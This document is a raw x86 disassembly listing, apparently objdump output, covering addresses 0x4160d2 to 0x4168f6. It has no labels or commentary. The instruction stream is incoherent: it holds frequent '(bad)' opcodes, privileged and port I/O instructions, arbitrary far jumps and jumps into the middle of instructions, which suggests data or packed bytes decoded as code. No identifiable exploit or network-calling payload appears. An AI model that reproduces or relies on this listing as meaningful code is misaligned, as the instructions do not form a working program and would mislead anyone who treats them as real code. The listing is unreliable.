  4160d2:	mov    esp,0x28105bb0
  4160d7:	push   esi
  4160d8:	sbb    dh,0xc0
  4160db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160dc:	jge    0x416151
  4160de:	pop    ebp
  4160df:	bound  edi,QWORD PTR [edi+0x26e94bff]
  4160e5:	xchg   dh,bl
  4160e7:	or     eax,0x879ab2e
  4160ec:	addr16 imul ebx,eax,0xffffff8a
  4160f0:	xchg   ebp,eax
  4160f1:	mov    dl,0xe0
  4160f3:	cwde   
  4160f4:	test   al,0xf2
  4160f6:	mov    bl,0x2d
  4160f8:	mov    ds:0x486a060c,al
  4160fd:	loope  0x4160f2
  4160ff:	mov    WORD PTR [edi+0x631857c6],ds
  416105:	sbb    DWORD PTR [ecx-0x5a6ca84a],eax
  41610b:	cs jg  0x416111
  41610e:	les    eax,FWORD PTR [ecx+0x2b46b1b9]
  416114:	mov    ecx,0xad063232
  416119:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41611a:	push   ss
  41611b:	imul   eax,DWORD PTR [ecx-0x19],0x7e
  41611f:	cmp    dh,dh
  416121:	lods   al,BYTE PTR ds:[esi]
  416122:	cmp    eax,ecx
  416124:	xchg   edx,eax
  416125:	cli    
  416126:	iret   
  416127:	inc    esp
  416128:	xchg   BYTE PTR [esi-0x29],ah
  41612b:	gs jl  0x416122
  41612e:	addr16 aas 
  416130:	push   ds
  416131:	stos   DWORD PTR es:[edi],eax
  416132:	pop    ebx
  416133:	test   ah,ch
  416135:	outs   dx,DWORD PTR ds:[esi]
  416136:	sti    
  416137:	jge    0x41615a
  416139:	cmp    ebp,ebx
  41613b:	and    eax,0x10fa4f28
  416140:	add    DWORD PTR [ebx-0x4e78a03c],ebp
  416146:	push   ss
  416147:	dec    edx
  416148:	inc    eax
  416149:	adc    DWORD PTR [ebp-0x3cc28088],ecx
  41614f:	dec    ecx
  416150:	test   eax,0x8d7d5ad5
  416155:	cdq    
  416156:	jmp    0x416125
  416158:	sti    
  416159:	sub    al,0xb4
  41615b:	test   BYTE PTR [edx],bl
  41615d:	clc    
  41615e:	jne    0x416196
  416160:	push   ecx
  416161:	ret    0xd7d2
  416164:	push   ebx
  416165:	aad    0xa
  416167:	neg    BYTE PTR [edx+0x35f4a06a]
  41616d:	(bad)  
  41616e:	cmp    eax,DWORD PTR [ebp-0x70accd0b]
  416174:	jmp    0x416107
  416176:	aas    
  416177:	ror    ecx,1
  416179:	stos   BYTE PTR es:[edi],al
  41617a:	push   es
  41617b:	cdq    
  41617c:	pop    ebx
  41617d:	ja     0x416153
  41617f:	xlat   BYTE PTR ds:[ebx]
  416180:	cmp    BYTE PTR [edx+0x5a],al
  416183:	fisub  WORD PTR [ebx-0x23674dee]
  416189:	stos   DWORD PTR es:[edi],eax
  41618a:	cmp    eax,DWORD PTR [ecx+edx*1+0x28]
  41618e:	outs   dx,DWORD PTR ds:[esi]
  41618f:	push   ebx
  416190:	jecxz  0x416175
  416192:	mov    ebx,0xada948f1
  416197:	jns    0x4161ee
  416199:	in     eax,0x54
  41619b:	cld    
  41619c:	mov    dl,0xff
  41619e:	aaa    
  41619f:	(bad)  
  4161a0:	stc    
  4161a1:	add    eax,0x358974ab
  4161a6:	outs   dx,DWORD PTR ds:[esi]
  4161a7:	and    esp,DWORD PTR [ebx]
  4161a9:	outs   dx,DWORD PTR ds:[esi]
  4161aa:	xchg   ebx,eax
  4161ab:	sbb    cl,BYTE PTR ds:0xe4dbeca0
  4161b1:	(bad)  
  4161b2:	(bad)  
  4161b3:	dec    edx
  4161b4:	jne    0x416217
  4161b6:	loopne 0x416152
  4161b8:	xchg   edx,eax
  4161b9:	data16 loopne 0x4161c4
  4161bc:	psllq  mm0,QWORD PTR [ebx+eiz*2]
  4161c0:	pop    ss
  4161c1:	xchg   ecx,esp
  4161c3:	adc    ecx,DWORD PTR [esi]
  4161c5:	outs   dx,DWORD PTR ds:[esi]
  4161c6:	fidivr WORD PTR [edi]
  4161c8:	adc    eax,0x65dadd81
  4161cd:	xchg   edx,eax
  4161ce:	aad    0xf1
  4161d0:	cmp    BYTE PTR [edx],al
  4161d2:	dec    esp
  4161d3:	lea    ebp,[eax+ecx*4+0x15]
  4161d7:	and    al,0x8a
  4161d9:	cmp    dl,BYTE PTR fs:[eax]
  4161dc:	pop    ebp
  4161de:	bound  ebp,QWORD PTR [esi-0x24]
  4161e1:	cmp    al,0x3
  4161e3:	pop    ebx
  4161e4:	(bad)  
  4161e6:	sbb    ecx,0x249bb412
  4161ec:	mov    al,ch
  4161ee:	and    BYTE PTR [ebp-0x36],dh
  4161f1:	repz jmp 0x416186
  4161f4:	cld    
  4161f5:	scas   al,BYTE PTR es:[edi]
  4161f6:	imul   ebp,DWORD PTR [eax],0x502cab44
  4161fc:	and    edx,DWORD PTR [eax+0x2ebbc1c3]
  416202:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416203:	shl    dh,0x8c
  416206:	dec    ebx
  416207:	mov    al,0xa5
  416209:	mov    esi,0x680d1538
  41620e:	aam    0x7
  416210:	inc    ebp
  416211:	pop    edi
  416212:	xchg   edx,eax
  416213:	cmp    eax,0xf4b504b1
  416218:	xchg   ebp,eax
  416219:	mov    ch,bl
  41621b:	std    
  41621c:	mov    BYTE PTR [ebx-0x49],ch
  41621f:	std    
  416220:	sub    al,0xa
  416222:	imul   ebp,ebx,0x15
  416225:	xor    DWORD PTR [edx-0x50],ecx
  416228:	mov    edi,0x1235cf25
  41622d:	or     DWORD PTR [edx-0x1486f676],0x68
  416234:	test   DWORD PTR [eax-0x416e7998],0x765c92b0
  41623e:	pop    edi
  41623f:	inc    esi
  416240:	js     0x416290
  416242:	and    BYTE PTR [ecx+0x1b],0xe6
  416246:	shl    BYTE PTR [eax-0x5a60c0bf],cl
  41624c:	in     al,dx
  41624d:	ret    0xf051
  416250:	aas    
  416251:	adc    eax,0x8a868b17
  416256:	push   ebp
  416257:	popf   
  416258:	xchg   DWORD PTR ss:[edi+0x3e],esi
  41625c:	repnz dec edi
  41625e:	hlt    
  41625f:	stos   DWORD PTR es:[edi],eax
  416260:	dec    esi
  416261:	es sbb bl,dh
  416264:	mov    ecx,edx
  416266:	add    eax,0xfba304c7
  41626b:	mov    dh,0x6d
  41626d:	bound  edx,QWORD PTR ds:0x6e3c9792
  416273:	(bad)
  416277:	inc    ebp
  416278:	(bad)  
  416279:	xor    ebp,DWORD PTR [esi+edx*8]
  41627c:	loop   0x4162a4
  41627e:	aam    0x1c
  416280:	sti    
  416281:	ins    BYTE PTR es:[edi],dx
  416282:	(bad)  
  416283:	stos   BYTE PTR es:[edi],al
  416284:	in     al,dx
  416285:	jns    0x4162d7
  416287:	call   0xe55a:0x415a2011
  41628e:	mov    eax,0x8f339c60
  416293:	daa    
  416294:	leave  
  416295:	dec    esi
  416296:	xchg   ecx,eax
  416297:	sbb    al,0xad
  416299:	fmul   st,st(5)
  41629b:	ds cld 
  41629d:	jb     0x416281
  41629f:	dec    ebx
  4162a0:	daa    
  4162a1:	dec    eax
  4162a2:	pop    ss
  4162a3:	dec    ecx
  4162a4:	loope  0x416283
  4162a6:	std    
  4162a7:	jmp    0x8e08:0x8d2af8b1
  4162ae:	sahf   
  4162af:	dec    esp
  4162b0:	jmp    0x9f06:0x84c2d26e
  4162b7:	mov    DWORD PTR [ebx],ebx
  4162b9:	scas   eax,DWORD PTR es:[edi]
  4162ba:	loop   0x4162f9
  4162bc:	add    DWORD PTR [ecx+0x516be91b],0x1ac38dcf
  4162c6:	adc    BYTE PTR [edi-0x3a318c38],0x52
  4162cd:	mov    WORD PTR [eax-0x68],fs
  4162d0:	rcr    BYTE PTR [ebx+0x131280ca],1
  4162d6:	fld    DWORD PTR [eax]
  4162d8:	rcl    BYTE PTR ds:0x43af2726,1
  4162de:	std    
  4162df:	popf   
  4162e0:	aas    
  4162e1:	jl     0x4162ea
  4162e3:	scas   eax,DWORD PTR es:[edi]
  4162e4:	mov    bl,0xb5
  4162e6:	clc    
  4162e7:	pop    eax
  4162e8:	pop    ebp
  4162e9:	stos   DWORD PTR es:[edi],eax
  4162ea:	or     eax,0x575d7f16
  4162ef:	mov    esp,0x572d4212
  4162f4:	cs push 0x179f001e
  4162fa:	and    DWORD PTR [esi+ecx*1-0x4eed3e30],ecx
  416301:	(bad)  
  416302:	mov    WORD PTR [esi],ss
  416304:	mov    ebp,0xa29829d7
  416309:	test   dh,0xd8
  41630c:	pop    edi
  41630d:	pushf  
  41630e:	xor    al,BYTE PTR [eax+0x15c90e36]
  416314:	cs jns 0x416363
  416317:	les    edi,FWORD PTR [ebx]
  416319:	mov    bl,0x77
  41631b:	outs   dx,DWORD PTR ds:[esi]
  41631c:	inc    esp
  41631d:	es imul edi,ebx,0x986b0cbe
  416324:	xchg   ecx,eax
  416325:	dec    ebp
  416326:	adc    ebx,esp
  416328:	or     esp,DWORD PTR [ebp-0x72]
  41632b:	or     eax,0x57011948
  416330:	mov    ch,0x74
  416333:	adc    eax,0xb77b2898
  416338:	iret   
  416339:	stos   BYTE PTR es:[edi],al
  41633a:	icebp  
  41633b:	mov    DWORD PTR ds:0x7b844675,edi
  416341:	dec    esp
  416342:	pop    ebx
  416343:	mov    ah,0xa8
  416345:	test   eax,0xfbe47a2b
  41634a:	sbb    bh,BYTE PTR [eax-0x6e081fa6]
  416350:	imul   edx,DWORD PTR [ecx],0xcc3d1529
  416356:	push   0x50
  416358:	pop    edx
  416359:	jmp    0x4163b1
  41635b:	cmc    
  41635c:	iret   
  41635d:	das    
  41635e:	mov    ch,BYTE PTR [edi+0x474596fc]
  416364:	(bad)  
  416365:	fwait
  416366:	jbe    0x4163e7
  416368:	pop    ss
  416369:	push   ebx
  41636a:	pop    ecx
  41636b:	or     ebx,DWORD PTR [eax+edx*8-0x52]
  41636f:	xor    BYTE PTR [edx],bl
  416371:	cdq    
  416372:	into   
  416373:	enter  0x5b2f,0x83
  416377:	pop    esi
  416378:	lods   eax,DWORD PTR ds:[esi]
  416379:	outs   dx,DWORD PTR ds:[esi]
  41637a:	cdq    
  41637b:	and    al,0x74
  41637d:	les    edi,FWORD PTR [eax]
  41637f:	in     al,dx
  416380:	cmp    al,cl
  416382:	and    al,0x6f
  416384:	dec    eax
  416385:	fld    QWORD PTR [ebx+0x35]
  416388:	xchg   esp,eax
  416389:	gs jecxz 0x416371
  41638c:	cwde   
  41638d:	sbb    dh,BYTE PTR [esp+eax*4-0x79]
  416391:	cld    
  416392:	cli    
  416393:	mov    gs,ebp
  416395:	(bad)  
  416396:	xor    bh,cl
  416398:	mov    al,ds:0x7f6297e
  41639d:	push   edi
  41639e:	int    0xcb
  4163a0:	mov    edi,0x928279d9
  4163a5:	or     al,0x9d
  4163a7:	pop    ss
  4163a8:	xchg   ecx,ebx
  4163aa:	sar    DWORD PTR [ecx+0x28],0x23
  4163ae:	or     al,0x8f
  4163b0:	sbb    BYTE PTR [edx+0xe],bh
  4163b3:	add    eax,0x4a364549
  4163b8:	ins    BYTE PTR es:[edi],dx
  4163b9:	fdivr  DWORD PTR [ebx-0x1afa0e7e]
  4163bf:	xor    bl,BYTE PTR [ecx]
  4163c1:	addr16 (bad) 
  4163c3:	out    0x55,al
  4163c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163c6:	or     ecx,eax
  4163c8:	cld    
  4163c9:	lea    edx,[ebx]
  4163cb:	push   esp
  4163cc:	mov    eax,ds:0x59d380ce
  4163d1:	add    dl,BYTE PTR [ebp+0x18dc185e]
  4163d7:	inc    ebp
  4163d8:	dec    eax
  4163d9:	xchg   ebp,eax
  4163da:	xchg   BYTE PTR [ecx+0x5493ab],dl
  4163e0:	icebp  
  4163e1:	adc    al,0x52
  4163e3:	and    DWORD PTR ds:0xf4eb8052,ebx
  4163e9:	dec    ebp
  4163ea:	or     esp,DWORD PTR [ecx+0x792c8a45]
  4163f0:	inc    ecx
  4163f1:	or     BYTE PTR [edx],bl
  4163f3:	mov    cl,bl
  4163f5:	loop   0x416474
  4163f7:	nop    DWORD PTR [eax-0x4d]
  4163fb:	cmp    eax,0x9f4c3354
  416400:	push   ebx
  416401:	fcmovbe st,st(4)
  416403:	push   edi
  416404:	retf   0x51b
  416407:	cmp    al,0xba
  416409:	aas    
  41640a:	(bad)  
  41640c:	test   al,0xd2
  41640e:	add    eax,DWORD PTR [ebx]
  416410:	push   ss
  416411:	jnp    0x41641a
  416413:	int    0x84
  416415:	jp     0x416426
  416417:	stos   BYTE PTR es:[edi],al
  416418:	xchg   ecx,eax
  416419:	inc    eax
  41641a:	and    BYTE PTR [ecx],ah
  41641c:	mov    edi,0x884fbdf9
  416421:	test   al,0xf8
  416423:	mov    bh,0xc8
  416425:	int3   
  416426:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416427:	out    dx,al
  416428:	dec    ebp
  416429:	andnps xmm2,xmm3
  41642c:	mov    eax,ds:0x967001e6
  416431:	sbb    eax,0xdf2b5132
  416436:	sar    BYTE PTR [ecx-0x1d],cl
  416439:	ret    0x80ab
  41643c:	pop    esp
  41643d:	xor    al,0x4f
  41643f:	jge    0x41649f
  416441:	pop    edx
  416442:	ins    BYTE PTR es:[edi],dx
  416443:	les    esi,FWORD PTR [ebp+0x33940f22]
  416449:	lods   eax,DWORD PTR ds:[esi]
  41644a:	rep outs dx,BYTE PTR ds:[esi]
  41644c:	add    BYTE PTR [edx+ebp*1+0xfd3d6db],0xf5
  416454:	pop    ecx
  416455:	lock stc 
  416457:	cmp    al,dh
  416459:	sbb    eax,0x8f2a017b
  41645e:	lods   eax,DWORD PTR ds:[esi]
  41645f:	and    eax,0x9484d8ce
  416464:	jmp    0x41646b
  416466:	or     al,0x5d
  416468:	xor    dl,BYTE PTR [eax-0x76]
  41646b:	and    BYTE PTR [ecx+0x2952f906],bh
  416471:	dec    ebp
  416472:	arpl   di,bp
  416474:	lds    edx,FWORD PTR [eax+0x33]
  416477:	sbb    edx,0x41
  41647a:	icebp  
  41647b:	xlat   BYTE PTR ds:[ebx]
  41647c:	stos   DWORD PTR es:[edi],eax
  41647d:	outs   dx,DWORD PTR ds:[esi]
  41647e:	ins    BYTE PTR es:[edi],dx
  41647f:	mov    esi,0xdcb7862b
  416484:	push   esi
  416485:	(bad)  
  416486:	and    edx,DWORD PTR [edx+0x1ae96e9e]
  41648c:	mov    gs:0x532cd0c2,eax
  416492:	inc    esi
  416493:	cmp    eax,0x50
	...
  416514:	adc    eax,0xfe3de0ab
  416519:	jg     0x4164f8
  41651b:	stos   DWORD PTR es:[edi],eax
  41651c:	mov    esi,DWORD PTR [edi-0x62c82fe5]
  416522:	mov    ebx,0x10927ce
  416527:	add    BYTE PTR [ecx+0x7],ch
  41652a:	add    BYTE PTR [eax],al
  41652c:	pop    esp
  41652d:	test   al,0x9b
  41652f:	les    ebx,FWORD PTR [ecx+eiz*4]
  416532:	mov    ds:0x6d361c14,al
  416537:	addr16 jle 0x4164bc
  41653a:	test   DWORD PTR [ebx],ebx
  41653c:	jge    0x4165b3
  41653e:	mov    esp,0x566b7571
  416543:	pop    ecx
  416544:	lods   eax,DWORD PTR ds:[esi]
  416545:	and    al,0x7b
  416547:	push   0x2b
  416549:	pop    esi
  41654a:	jmp    FWORD PTR [ebx+0x22090d64]
  416550:	mov    eax,ds:0xc401f1d3
  416555:	popf   
  416556:	pushf  
  416557:	inc    edx
  416558:	or     eax,0xd8fb4bf9
  41655d:	es mov edx,0xa6acfb0f
  416563:	xchg   BYTE PTR [ebx],ah
  416565:	pop    ss
  416566:	ds addr16 jnp 0x4165dc
  41656a:	daa    
  41656b:	xchg   edi,eax
  41656c:	mov    edi,eax
  41656e:	mov    ebx,0x8faeb32
  416573:	fabs   
  416575:	or     dh,BYTE PTR cs:[edi]
  416578:	pushf  
  416579:	shl    DWORD PTR es:[edx+0x33],0x6
  41657e:	pop    eax
  41657f:	pop    ds
  416580:	push   eax
  416581:	ins    DWORD PTR es:[edi],dx
  416582:	nop
  416583:	add    eax,0x69296d5e
  416588:	jg     0x416567
  41658a:	aaa    
  41658b:	inc    edx
  41658c:	(bad)  
  41658d:	fdivr  DWORD PTR [edi+eax*8+0x777f31e4]
  416594:	out    0xed,eax
  416596:	stc    
  416597:	jmp    0x9fcb:0xbc5b56d5
  41659e:	xlat   BYTE PTR ds:[ebx]
  41659f:	xchg   dl,cl
  4165a1:	xchg   edi,eax
  4165a2:	stos   DWORD PTR es:[edi],eax
  4165a3:	out    dx,al
  4165a4:	jo     0x4165da
  4165a6:	jmp    0x66b3cb53
  4165ab:	cs jnp 0x4165d5
  4165ae:	mov    ebx,0x668ef6a4
  4165b3:	cmp    edx,esp
  4165b5:	inc    ecx
  4165b6:	add    al,0xef
  4165b8:	mov    bl,bh
  4165ba:	xchg   ch,al
  4165bc:	sbb    DWORD PTR [edx+0x44],edi
  4165bf:	jg     0x416552
  4165c1:	fimul  DWORD PTR ds:0x5d69816a
  4165c7:	ret    
  4165c8:	repnz (bad) 
  4165ca:	xor    al,0x9
  4165cc:	dec    ebp
  4165cd:	in     al,dx
  4165ce:	inc    eax
  4165cf:	mov    ebp,0xfc5bb3e7
  4165d4:	dec    esp
  4165d5:	push   0x7a
  4165d7:	add    DWORD PTR [esi+edi*2-0x1548b68f],ebp
  4165de:	std    
  4165df:	jnp    0x41657f
  4165e1:	lock sbb BYTE PTR [esi-0x7cbc467],bh
  4165e8:	fwait
  4165e9:	xchg   esi,eax
  4165ea:	jle    0x4165b4
  4165ec:	inc    eax
  4165ed:	fs stc 
  4165ef:	leave  
  4165f0:	jmp    0x41666d
  4165f2:	and    ebp,DWORD PTR [eax]
  4165f4:	adc    dh,BYTE PTR [esi-0x406814b6]
  4165fa:	add    eax,0x53aacb07
  4165ff:	push   ss
  416600:	pop    ebx
  416601:	or     DWORD PTR [edx-0x32885125],eax
  416607:	lock (bad) 
  41660a:	rcr    DWORD PTR [edx+0x42],0x5a
  41660e:	icebp  
  41660f:	fild   QWORD PTR [edi+ebp*2+0x5f]
  416613:	inc    edi
  416614:	pop    ebx
  416615:	jbe    0x41660b
  416617:	mov    ah,0x93
  416619:	cs sbb bh,ah
  41661c:	rol    bl,1
  41661e:	xor    ebp,0xffffffde
  416621:	test   al,0x8e
  416623:	js     0x4165bb
  416625:	and    eax,0x1a907f2f
  41662a:	mov    edi,0xf6655663
  41662f:	ret    
  416630:	loope  0x41666e
  416632:	push   ss
  416633:	cwde   
  416634:	push   ecx
  416635:	int3   
  416636:	scas   al,BYTE PTR es:[edi]
  416637:	lock imul ebx,DWORD PTR [edi],0x403b30b7
  41663e:	adc    DWORD PTR [ebp+0x6e7937a6],0xffffffbc
  416645:	out    dx,al
  416646:	mov    bl,0xcf
  416648:	das    
  416649:	ins    DWORD PTR es:[edi],dx
  41664a:	iret   
  41664b:	rcr    DWORD PTR [eax],cl
  41664d:	dec    ebp
  41664e:	test   eax,0xa76407ad
  416653:	dec    ecx
  416654:	mov    WORD PTR [edx+ebx*4+0x58],fs
  416658:	jl     0x416671
  41665a:	jg     0x416633
  41665c:	xor    edi,DWORD PTR [ecx]
  41665e:	test   DWORD PTR [edx],ebx
  416660:	repnz retf 
  416662:	push   edi
  416663:	pusha  
  416664:	fcomp  DWORD PTR [ebx+0x74]
  416667:	xor    ebp,DWORD PTR [edx+eax*8-0x2]
  41666b:	mov    bl,0xcc
  41666d:	retf   0xc5ec
  416670:	xchg   esi,eax
  416671:	mov    ecx,eax
  416673:	mov    al,ds:0x9f91ff31
  416678:	add    eax,0xf5a249d6
  41667d:	shr    DWORD PTR [ebx],1
  41667f:	arpl   bp,di
  416681:	mov    esi,0xf15e98ce
  416686:	test   BYTE PTR [eax+0x6f8f12ac],cl
  41668c:	cld    
  41668d:	js     0x416639
  41668f:	or     ch,BYTE PTR [edi-0x23f72067]
  416695:	(bad)  
  416696:	xor    esi,DWORD PTR [edx]
  416698:	mov    WORD PTR [esi-0x2b],gs
  41669b:	add    DWORD PTR [edx-0x2c],ecx
  41669e:	sub    eax,0xa959e44a
  4166a3:	ins    BYTE PTR es:[edi],dx
  4166a4:	shr    ah,1
  4166a6:	pusha  
  4166a7:	push   cs
  4166a8:	add    BYTE PTR [eax+0x39],al
  4166ab:	hlt    
  4166ac:	xor    al,0x98
  4166ae:	mov    ch,0x62
  4166b0:	loopne 0x41669b
  4166b2:	(bad)  
  4166b3:	mov    esp,edi
  4166b5:	fwait
  4166b6:	mov    edx,0x5b3b4bd9
  4166bb:	inc    ebp
  4166bc:	jo     0x416644
  4166be:	test   bl,ch
  4166c0:	out    0x15,al
  4166c2:	dec    ebx
  4166c3:	pop    esi
  4166c4:	mov    al,0xc8
  4166c6:	jne    0x4166ae
  4166c8:	mov    dl,0x1c
  4166ca:	pop    ss
  4166cb:	mov    bh,0x9a
  4166cd:	sub    eax,0xd3a7e122
  4166d2:	(bad)
  4166d5:	jno    0x4166e2
  4166d7:	xor    BYTE PTR [edi],dh
  4166d9:	pop    edi
  4166da:	hlt    
  4166db:	mov    dl,ch
  4166dd:	xchg   esp,eax
  4166de:	jmp    0x5e9b9f7d
  4166e3:	pop    edx
  4166e4:	push   ebp
  4166e5:	test   al,0x8
  4166e7:	cmp    al,0xc1
  4166e9:	jp     0x41667e
  4166eb:	jno    0x41676a
  4166ed:	fsub   QWORD PTR [edx]
  4166ef:	pop    ebx
  4166f0:	loop   0x4166d7
  4166f2:	cmp    DWORD PTR [eax],esi
  4166f4:	ror    ebp,1
  4166f6:	sub    al,0xa3
  4166f8:	cmp    ah,BYTE PTR [edx+0x43abca4d]
  4166fe:	and    BYTE PTR [esi],bh
  416700:	cli    
  416701:	imul   edi,DWORD PTR [eax+0x1c],0x29
  416705:	test   al,0x8c
  416707:	jp     0x416746
  416709:	cwde   
  41670a:	sub    al,0xe6
  41670c:	cmp    bl,BYTE PTR [edi]
  41670e:	or     esi,ecx
  416710:	into   
  416711:	in     al,0x26
  416713:	(bad)  
  416714:	cmp    ebx,DWORD PTR [edx-0x35e3f878]
  41671a:	int    0xfc
  41671c:	xchg   esi,eax
  41671d:	lods   eax,DWORD PTR ds:[esi]
  41671e:	push   ebp
  41671f:	jmp    0x416780
  416721:	clc    
  416722:	adc    al,BYTE PTR [ecx+0x78]
  416725:	mov    cl,0xd1
  416727:	push   ebx
  416728:	adc    al,0xf2
  41672b:	out    dx,al
  41672c:	(bad)  
  41672d:	mov    esp,0x5731904c
  416732:	pop    ecx
  416733:	jbe    0x416759
  416735:	or     BYTE PTR [eax],ch
  416737:	xlat   BYTE PTR ds:[ebx]
  416738:	mov    DWORD PTR [ebx],eax
  41673a:	fimul  DWORD PTR [ecx]
  41673c:	in     al,dx
  41673d:	xchg   DWORD PTR [edi],edx
  41673f:	hlt    
  416740:	aam    0x76
  416742:	sahf   
  416743:	mov    bl,0xe8
  416745:	dec    esi
  416746:	xor    al,0x9b
  416748:	mov    esp,DWORD PTR [edx+0x3d]
  41674b:	iret   
  41674c:	fmul   DWORD PTR [ebx-0x76a80aa0]
  416752:	xchg   esi,eax
  416753:	dec    eax
  416754:	inc    edx
  416755:	xchg   esp,eax
  416756:	cld    
  416757:	mov    ah,0xda
  416759:	mov    bl,0xd1
  41675b:	out    0x4,al
  41675d:	out    dx,al
  41675e:	inc    ecx
  41675f:	add    ebp,DWORD PTR [edi]
  416761:	xor    al,0x72
  416763:	cdq    
  416764:	pop    esp
  416765:	mov    ss,WORD PTR [eax+ecx*4]
  416768:	out    dx,eax
  416769:	cmp    DWORD PTR [eax],0xae9d5f90
  41676f:	in     eax,0xab
  416771:	sti    
  416772:	mov    al,ds:0x2ebec5f4
  416777:	cs push edi
  416779:	cmp    DWORD PTR [ebx],ebp
  41677b:	mov    bh,ah
  41677d:	fucom  st(7)
  41677f:	add    al,BYTE PTR [edi]
  416781:	adc    BYTE PTR [edi+eax*4],bh
  416784:	stc    
  416785:	dec    ecx
  416786:	repz test eax,0xe8bf1bb1
  41678c:	mov    al,ds:0xe4c0030b
  416791:	push   edi
  416792:	arpl   dx,bp
  416794:	and    BYTE PTR [edx-0x16],ch
  416797:	dec    ebp
  416798:	jecxz  0x416738
  41679a:	jl     0x416750
  41679c:	imul   edi,DWORD PTR [esi+0x3ab9bcb7],0x36
  4167a3:	sbb    eax,0x29fd18d3
  4167a8:	pop    ecx
  4167a9:	or     al,0x4c
  4167ab:	shl    DWORD PTR [ebx],1
  4167ad:	stos   DWORD PTR es:[edi],eax
  4167ae:	jle    0x41677a
  4167b0:	jb     0x416744
  4167b2:	push   ds
  4167b3:	add    DWORD PTR [edi],ecx
  4167b5:	test   DWORD PTR [edx],ecx
  4167b7:	inc    esi
  4167b8:	sbb    BYTE PTR ds:0xc71c394,dh
  4167be:	xchg   ebx,eax
  4167bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167c0:	out    dx,al
  4167c1:	add    ch,BYTE PTR [esi]
  4167c3:	pop    eax
  4167c4:	dec    edi
  4167c5:	call   DWORD PTR [ebx]
  4167c7:	cmp    DWORD PTR [edi+0x3c],ebx
  4167ca:	pop    ds
  4167cb:	gs ins DWORD PTR es:[edi],dx
  4167cd:	mov    WORD PTR [ebx],?
  4167cf:	xchg   esp,eax
  4167d0:	mov    dh,0xbd
  4167d2:	and    al,0x34
  4167d4:	test   edi,0x90a41835
  4167da:	cmp    eax,0x8eda898f
  4167df:	(bad)  
  4167e0:	jmp    0x212b:0xaa856adb
  4167e7:	xchg   ebx,eax
  4167e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167e9:	mov    al,0x9f
  4167eb:	mov    ch,0x52
  4167ed:	ror    DWORD PTR [esi*8-0x3f532026],cl
  4167f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167f5:	lods   al,BYTE PTR ds:[esi]
  4167f6:	jne    0x416864
  4167f8:	mov    dh,0x96
  4167fa:	and    DWORD PTR [edx],eax
  4167fc:	inc    BYTE PTR [ebx-0x2b]
  4167ff:	mov    eax,ds:0xc5f7dcb7
  416804:	fwait
  416805:	mov    edx,0x3b537f78
  41680a:	loop   0x416849
  41680c:	pop    eax
  41680d:	aas    
  41680e:	xchg   edx,eax
  41680f:	inc    ecx
  416810:	cwde   
  416811:	jbe    0x41684f
  416813:	mov    ss,WORD PTR [ecx+0x342a2537]
  416819:	push   edi
  41681a:	mov    cl,0xc5
  41681c:	adc    al,BYTE PTR [ebx]
  41681e:	sub    DWORD PTR [esi-0x76c82e82],0xffffff94
  416825:	xchg   esp,eax
  416826:	out    dx,al
  416827:	add    DWORD PTR [ebp+0x6d58ca34],ecx
  41682d:	cdq    
  41682e:	mov    WORD PTR [edi-0x78],?
  416831:	scas   eax,DWORD PTR es:[edi]
  416832:	test   al,0xfb
  416834:	ds js  0x4167b8
  416837:	sahf   
  416838:	inc    edx
  416839:	jb     0x416821
  41683b:	loop   0x416843
  41683d:	mov    edi,0x332824f1
  416842:	(bad)  
  416843:	mov    dl,0x6b
  416845:	sbb    edi,ecx
  416847:	pop    eax
  416848:	inc    ebx
  416849:	in     al,0xfa
  41684b:	cmp    BYTE PTR [eax],dh
  41684d:	stos   DWORD PTR es:[edi],eax
  41684e:	pop    ds
  41684f:	jmp    0x4168bc
  416851:	push   ecx
  416852:	jmp    0xaa175828
  416857:	and    dl,BYTE PTR [edi+0x7a921c5e]
  41685d:	mov    ah,0xec
  41685f:	ja     0x416844
  416861:	push   ebx
  416862:	mov    edi,0x2be7c3cb
  416867:	mov    eax,ds:0x337348d4
  41686c:	dec    edx
  41686d:	retf   0xbb6a
  416870:	jo     0x4168c5
  416872:	mov    esi,0xb06c7435
  416877:	das    
  416878:	test   BYTE PTR ds:0xd3a2b576,dh
  41687e:	and    ch,BYTE PTR [eax-0x78]
  416881:	jno    0x416853
  416883:	fs jecxz 0x416890
  416886:	div    DWORD PTR [edx+0x10]
  416889:	xor    bl,bh
  41688b:	push   edi
  41688c:	adc    eax,0x209fb759
  416891:	adc    al,0xb9
  416893:	dec    eax
  416894:	nop
  416895:	dec    edi
  416896:	pop    ds
  416897:	repz (bad) 
  41689a:	inc    ecx
  41689b:	popf   
  41689c:	das    
  41689d:	pop    esi
  41689e:	xor    ecx,DWORD PTR [eax+0x10d5f50b]
  4168a4:	popa   
  4168a5:	stos   DWORD PTR es:[edi],eax
  4168a6:	and    ecx,esp
  4168a8:	test   al,0xbe
  4168aa:	add    cl,dh
  4168ac:	push   esi
  4168ad:	push   ds
  4168ae:	jge    0x41683d
  4168b0:	shl    ebx,cl
  4168b2:	push   edx
  4168b3:	add    eax,0x55d50a31
  4168b8:	retf   0x93c2
  4168bb:	scas   eax,DWORD PTR es:[edi]
  4168bc:	pop    edi
  4168bd:	add    DWORD PTR [ecx],ebp
  4168bf:	mov    DWORD PTR [eax+0x50],ebp
  4168c2:	scas   eax,DWORD PTR es:[edi]
  4168c3:	test   al,0x7f
  4168c5:	dec    edi
  4168c6:	adc    DWORD PTR [edx+ecx*1+0x227bbea4],0x8c244aa6
  4168d1:	cmp    cl,BYTE PTR [esi+0x7a64cc5d]
  4168d7:	(bad)  
  4168d8:	stc    
  4168d9:	mov    ds:0x3ff6f637,eax
  4168de:	pusha  
  4168df:	jg     0x41690a
  4168e1:	pop    esi
  4168e2:	fs mov bl,0x83
  4168e5:	neg    BYTE PTR [ebx]
  4168e7:	cli    
  4168e8:	push   eax
  4168e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168ea:	fdiv   st(2),st
  4168ec:	jno    0x416886
  4168ee:	jno    0x41690d
  4168f0:	fsubr  st,st(4)
  4168f2:	cmp    BYTE PTR [edx-0x31],bl
  4168f5:	(bad)  
  4168f6:	ins    BYTE PTR es:[edi],dx
